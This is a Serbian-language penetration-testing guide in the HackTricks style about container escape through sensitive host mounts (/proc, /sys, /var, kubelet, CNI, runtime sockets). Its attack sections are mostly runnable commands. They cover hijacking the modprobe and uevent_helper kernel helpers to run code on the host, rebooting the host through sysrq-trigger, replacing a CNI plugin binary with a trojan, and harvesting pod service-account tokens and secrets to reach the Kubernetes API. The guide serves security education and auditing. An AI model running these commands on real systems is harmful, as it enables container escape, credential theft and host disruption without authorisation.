# Osetljivi mount-ovi hosta

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Host mount-ovi su jedna od najvažnijih praktičnih površina za container-escape, jer često urušavaju pažljivo izolovan prikaz procesa i vraćaju direktnu vidljivost host resursa. Opasni slučajevi nisu ograničeni na `/`. Bind mount-ovi za `/proc`, `/sys`, `/var`, runtime socket-e, stanje kojim upravlja kubelet ili putanje povezane sa uređajima mogu izložiti kernel kontrole, credentials, filesystem-e susednih container-a i runtime interfejse za upravljanje.

Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti zato što je model zloupotrebe cross-cutting. Writable host mount je opasan delom zbog mount namespace-ova, delom zbog user namespace-ova, delom zbog AppArmor ili SELinux coverage-a, a delom zbog toga koja je tačna host putanja izložena. Posmatranje ove teme kao zasebne celine znatno olakšava analizu attack surface-a.

## Izloženost `/proc`-u

procfs sadrži i uobičajene informacije o procesima i kernel control interfejse sa velikim uticajem. Bind mount kao što je `-v /proc:/host/proc` ili prikaz container-a koji izlaže neočekivane writable proc entries zato može dovesti do disclosure-a informacija, denial of service-a ili direktnog code execution-a na hostu.

Procfs putanje visoke vrednosti uključuju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Zloupotreba

Počnite proverom koje su procfs entries visoke vrednosti vidljive ili writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe` i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu kada su upisive. `kallsyms`, `kmsg`, `kcore` i `config.gz` predstavljaju moćne izvore za reconnaissance tokom kernel exploitation-a. `sched_debug` i `mountinfo` otkrivaju kontekst procesa, cgroup-ova i filesystem-a, što može pomoći u rekonstrukciji rasporeda hosta iz samog containera.

Praktična vrednost svake putanje je različita, a tretiranje svih njih kao da imaju isti uticaj otežava triage:

- `/proc/sys/kernel/core_pattern`
Ako je upisiva, ovo je jedna od najuticajnijih procfs putanja, jer će kernel nakon crash-a izvršiti pipe handler. Container koji može da usmeri `core_pattern` na payload smešten u svom overlay-u ili na montiranoj host putanji često može da ostvari izvršavanje koda na hostu. Pogledajte i [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
- `/proc/sys/kernel/modprobe`
Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pokrene logiku učitavanja modula. Ako je upisiva iz containera i interpretira se u kontekstu hosta, može postati još jedan primitive za izvršavanje koda na hostu. Posebno je zanimljiva kada postoji način da se aktivira helper putanja.
- `/proc/sys/vm/panic_on_oom`
Ovo obično nije čist primitive za escape, ali može pretvoriti pritisak na memoriju u denial of service na nivou celog hosta, tako što OOM uslove pretvara u ponašanje kernel panic-a.
- `/proc/sys/fs/binfmt_misc`
Ako je interfejs za registraciju upisiv, attacker može registrovati handler za izabranu magic vrednost i dobiti izvršavanje u kontekstu hosta kada se izvrši odgovarajuća datoteka.
- `/proc/config.gz`
Koristan je za triage kernel exploit-a. Pomaže u utvrđivanju toga koji su podsistemi, mitigacije i opcione kernel funkcije omogućeni, bez potrebe za metapodacima o paketima na hostu.
- `/proc/sysrq-trigger`
Uglavnom je denial-of-service putanja, ali veoma ozbiljna. Može odmah restartovati host, izazvati panic ili ga na drugi način poremetiti.
- `/proc/kmsg`
Otkriva poruke iz kernel ring buffer-a. Koristan je za fingerprinting hosta, analizu crash-a i, u nekim okruženjima, za leak informacija korisnih za kernel exploitation.
- `/proc/kallsyms`
Vredan je kada je čitljiv, jer otkriva informacije o eksportovanim kernel simbolima i može pomoći u zaobilaženju pretpostavki o randomizaciji adresa tokom razvoja kernel exploit-a.
- `/proc/[pid]/mem`
Ovo je direktan interfejs za memoriju procesa. Ako je ciljni proces dostupan uz neophodne ptrace-style uslove, može omogućiti čitanje ili izmenu memorije drugog procesa. Realni uticaj u velikoj meri zavisi od credential-a, `hidepid`, Yama-e i ptrace ograničenja, pa je ovo moćna, ali uslovna putanja.
- `/proc/kcore`
Otkriva prikaz sistemske memorije u obliku core image-a. Datoteka je ogromna i nezgodna za korišćenje, ali ako je smisleno čitljiva, to ukazuje na ozbiljno izloženu memorijsku površinu hosta.
- `/proc/kmem` i `/proc/mem`
Istorijski veoma uticajni interfejsi za pristup sirovoj memoriji. Na mnogim modernim sistemima su onemogućeni ili strogo ograničeni, ali ako postoje i mogu se koristiti, treba ih tretirati kao kritične nalaze.
- `/proc/sched_debug`
Leak-uje informacije o raspoređivanju i task-ovima, što može otkriti identitete procesa na hostu čak i kada drugi prikazi procesa izgledaju urednije nego što se očekuje.
- `/proc/[pid]/mountinfo`
Izuzetno je koristan za rekonstrukciju toga gde se container zaista nalazi na hostu, koje putanje koriste overlay i da li upisivi mount odgovara sadržaju hosta ili samo sloju containera.

Ako su `/proc/[pid]/mountinfo` ili overlay detalji čitljivi, iskoristite ih da pronađete host putanju filesystem-a containera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ove komande su korisne zato što brojni trikovi za izvršavanje na hostu zahtevaju pretvaranje putanje unutar containera u odgovarajuću putanju iz perspektive hosta.

### Celovit primer: zloupotreba putanje `modprobe` helpera

Ako je `/proc/sys/kernel/modprobe` upisiv iz containera, a putanja helpera se tumači u kontekstu hosta, može se preusmeriti na payload pod kontrolom napadača:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tačan okidač zavisi od cilja i ponašanja kernela, ali važno je da putanja pomoćnog programa sa dozvolom pisanja može da preusmeri buduće pozivanje pomoćnog programa kernela na sadržaj host putanje pod kontrolom napadača.

### Potpun primer: Izviđanje kernela pomoću `kallsyms`, `kmsg` i `config.gz`

Ako je cilj procena mogućnosti eksploatacije, a ne trenutni escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ove komande pomažu da se utvrdi da li su korisne informacije o simbolima vidljive, da li nedavne kernel poruke otkrivaju zanimljivo stanje i koje su kernel funkcije ili mitigacije uključene prilikom kompajliranja. Uticaj obično nije direktan escape, ali može znatno ubrzati trijažu kernel ranjivosti.

### Potpun primer: SysRq ponovno pokretanje hosta

Ako je `/proc/sysrq-trigger` upisiv i dostupan iz host prikaza:
```bash
echo b > /proc/sysrq-trigger
```
Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izlaganje procfs-a može biti daleko ozbiljnije od information disclosure-a.

## Izlaganje `/sys`-a

sysfs izlaže velike količine informacija o stanju kernela i uređaja. Neke sysfs putanje su uglavnom korisne za fingerprinting, dok druge mogu uticati na izvršavanje helper-a, ponašanje uređaja, konfiguraciju security-modula ili stanje firmware-a.

Visokovredne sysfs putanje uključuju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na ponašanje upravljanja temperaturom, a samim tim i na stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` može leak-ovati informacije o crash dump-u i rasporedu kernela, što pomaže pri low-level fingerprinting-u hosta. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, pa neočekivani pristup može otkriti ili izmeniti stanje povezano sa MAC-om. EFI varijable mogu uticati na boot settings koji se čuvaju u firmware-u, zbog čega su mnogo ozbiljnije od običnih configuration fajlova. `debugfs` pod `/sys/kernel/debug` je naročito opasan jer je namerno developerski interfejs, sa znatno manje safety očekivanja nego hardened kernel API-ji namenjeni produkcionim sistemima.

Korisne komande za pregled ovih putanja su:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Šta ove komande čini zanimljivim:

- `/sys/kernel/security` može otkriti da li su AppArmor, SELinux ili neka druga LSM površina vidljivi na način koji je trebalo da ostane dostupna samo hostu.
- `/sys/kernel/debug` je često najalarmantniji nalaz u ovoj grupi. Ako je `debugfs` montiran i dostupan za čitanje ili upis, očekujte široku površinu usmerenu ka kernelu, čiji tačan rizik zavisi od omogućenih debug čvorova.
- Izlaganje EFI promenljivih je ređe, ali ima visok uticaj jer dotiče podešavanja zasnovana na firmware-u, a ne obične datoteke tokom rada sistema.
- `/sys/class/thermal` je uglavnom relevantan za stabilnost hosta i interakciju sa hardverom, a ne za uredan shell-style escape.
- `/sys/kernel/vmcoreinfo` je prvenstveno izvor podataka za fingerprinting hosta i analizu padova, koristan za razumevanje stanja kernela na niskom nivou.

### Full Example: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` dostupan za upis, kernel može izvršiti attacker-controlled helper kada se pokrene `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Razlog zbog kog ovo funkcioniše jeste to što se putanja helper-a tumači iz perspektive hosta. Kada se aktivira, helper se pokreće u kontekstu hosta, a ne unutar trenutnog kontejnera.

## Izlaganje `/var` direktorijuma

Mountovanje host-ovog `/var` direktorijuma u kontejner često se potcenjuje jer ne deluje tako dramatično kao mountovanje `/`. U praksi, to može biti dovoljno za pristup runtime socket-ima, direktorijumima sa snapshot-ima kontejnera, kubelet-managed pod volume-ima, projektovanim service-account tokenima i filesystem-ima susednih aplikacija. Na modernim nodovima, `/var` je često mesto na kom se zapravo nalazi najzanimljivije operativno stanje kontejnera.

### Kubernetes primer

Pod sa `hostPath: /var` često može da čita projektovane tokene drugih podova i sadržaj overlay snapshot-a:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ove komande su korisne jer pokazuju da li mount izlaže samo beznačajne aplikacione podatke ili kritične akreditive klastera. Čitljiv service-account token može odmah pretvoriti lokalno izvršavanje koda u pristup Kubernetes API-ju.

Ako je token prisutan, proverite čemu može da pristupi umesto da se zaustavite na njegovom pronalaženju:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Uticaj ovde može biti mnogo veći od lokalnog pristupa čvoru. Token sa širokim RBAC ovlašćenjima može pretvoriti montirani `/var` u kompromitovanje celog klastera.

### Docker i containerd primer

Na Docker hostovima relevantni podaci se često nalaze pod `/var/lib/docker`, dok se na Kubernetes čvorovima zasnovanim na containerd-u mogu nalaziti pod `/var/lib/containerd` ili putanjama specifičnim za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ako montirani `/var` izlaže sadržaj snapshot-a drugog workload-a sa dozvolom upisivanja, napadač može da izmeni datoteke aplikacije, postavi web sadržaj ili promeni startup skripte bez menjanja konfiguracije trenutnog kontejnera.

Konkretne ideje za zloupotrebu nakon pronalaženja sadržaja snapshot-a sa dozvolom upisivanja:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ove komande su korisne jer prikazuju tri glavne kategorije uticaja montiranog direktorijuma `/var`: neovlašćenu izmenu aplikacija, pronalaženje secrets i lateralno kretanje ka susednim workload-ovima.

## Kubelet State, Plugins And CNI Paths

Mount direktorijuma `/var/lib/kubelet`, `/opt/cni/bin` ili `/etc/cni/net.d` često se izlaže kroz privilegovane DaemonSets, CNI agents, CSI node plugins, GPU operators i storage helpers. Ovi mount-ovi se lako mogu odbaciti kao „node plumbing“, ali se nalaze direktno u izvršnom toku za nove pod-ove i često sadrže kubelet credentials, projected secrets, registration sockets i izvršne plugin binaries na hostu.

Ciljevi visoke vrednosti obuhvataju:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Korisne komande za proveru su:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Zašto su ove putanje važne:

- `/var/lib/kubelet/pki` može otkriti kubelet client certificates i druge credentials lokalne za node, koji se ponekad mogu ponovo upotrebiti protiv API servera ili TLS endpoints koji su namenjeni kubeletu, u zavisnosti od dizajna clustera.
- `/var/lib/kubelet/pods` često sadrži projected service-account tokens i montirane Secrets za susedne podove na istom node-u.
- `/var/lib/kubelet/pod-resources/kubelet.sock` je prvenstveno površina za reconnaissance, ali veoma korisna: otkriva koji podovi i containers trenutno koriste GPUs, hugepages, SR-IOV devices i druge oskudne resurse lokalne za node.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` otkrivaju koji su CSI, DRA i device plugins instalirani i sa kojim sockets kubelet treba da komunicira. Ako su ti direktorijumi writable, a ne samo readable, nalaz je mnogo ozbiljniji.
- `/opt/cni/bin` i `/etc/cni/net.d` nalaze se direktno na putanji za podešavanje pod-network-a. Writable pristup tamo često predstavlja odloženi primitive za host execution, a ne samo izlaganje konfiguracije.

### Potpun primer: Writable `/opt/cni/bin`

Ako je host CNI binary directory montiran read-write, zamena plugina može biti dovoljna za dobijanje host execution-a sledeći put kada kubelet kreira pod sandbox na tom node-u:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Ovo nije toliko neposredno kao montirani `docker.sock`, ali je često realističnije u kompromitovanim Kubernetes infrastructure podovima. Važno je to što se izmenjeni binary kasnije izvršava u okviru procesa podešavanja mreže hosta, a ne u trenutnom containeru.


## Runtime Sockets

Osetljivi mount-ovi hosta često uključuju runtime socket-e, a ne cele direktorijume. Toliko su važni da zaslužuju da ih ovde izričito ponovimo:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije nakon što se jedan od ovih socket-a montira.

Kao brz obrazac prve interakcije:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ako neki od ovih pokušaja uspe, putanja od "mounted socket" do "start a more privileged sibling container" obično je mnogo kraća od bilo koje putanje za kernel breakout.

## Hijacking zadatka preko upisive host putanje

Upisivi host mount ne mora da izlaže `/` da bi bio opasan. Ako montirana putanja sadrži skripte, konfiguracione datoteke, hook-ove, plugine ili datoteke koje kasnije koristi host-side zakazani zadatak ili servis, container možda može da promeni ono što host izvršava.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Ako host proces koristi fajl sa dozvolom upisa, tokom testiranja zadržite payload jednostavnim i uočljivim:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Zanimljiv deo je granica poverenja: upis se izvršava iz kontejnera, ali se izvršavanje kasnije odvija u kontekstu host servisa. Ovo pretvara uski hostPath ili bind mount u primitivu za odloženo izvršavanje koda na hostu.

## CVE-ovi povezani sa mount-ovima

Host mount-ovi se takođe prepliću sa ranjivostima runtime-a. Važni noviji primeri obuhvataju:

- `CVE-2024-21626` u `runc`-u, gde je procureli file descriptor direktorijuma mogao da postavi radni direktorijum na filesystem-u hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` u BuildKit-u, gde su zlonamerni Dockerfile-ovi, frontend-i i `RUN --mount` tokovi mogli ponovo da omoguće pristup fajlovima hosta, brisanje ili povišene privilegije tokom build-ova.
- `CVE-2024-1753` u Buildah i Podman build tokovima, gde su posebno kreirani bind mount-ovi tokom build-a mogli da izlože `/` sa read-write pristupom.
- `CVE-2025-47290` u `containerd` 2.1.0, gde je TOCTOU tokom raspakivanja image-a mogao omogućiti posebno kreiranom image-u da izmeni filesystem hosta tokom pull-a.

Ovi CVE-ovi su ovde važni jer pokazuju da rukovanje mount-ovima nije samo pitanje konfiguracije operatora. I sam runtime može da uvede uslove za bekstvo zasnovane na mount-ovima.

## Provere

Koristite sledeće komande da brzo pronađete mount izloženosti najveće vrednosti:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Šta je ovde zanimljivo:

- Root hosta, `/proc`, `/sys`, `/var` i runtime socket-i su nalazi visokog prioriteta.
- Writable proc/sys unosi često znače da mount izlaže globalne kernel kontrole hosta, a ne bezbedan prikaz container-a.
- Montirane `/var` putanje zahtevaju proveru credential-a i susednih workload-a, a ne samo pregled filesystem-a.
- Kubelet state direktorijumi i CNI/plugin putanje zaslužuju isti prioritet kao runtime socket-i, jer se često nalaze direktno na node putanji za kreiranje pod-ova i distribuciju credential-a.

## Reference

- [Lokalni fajlovi i putanje koje koristi Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container može da pristupi hostu putem `hostPath` mount-a](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
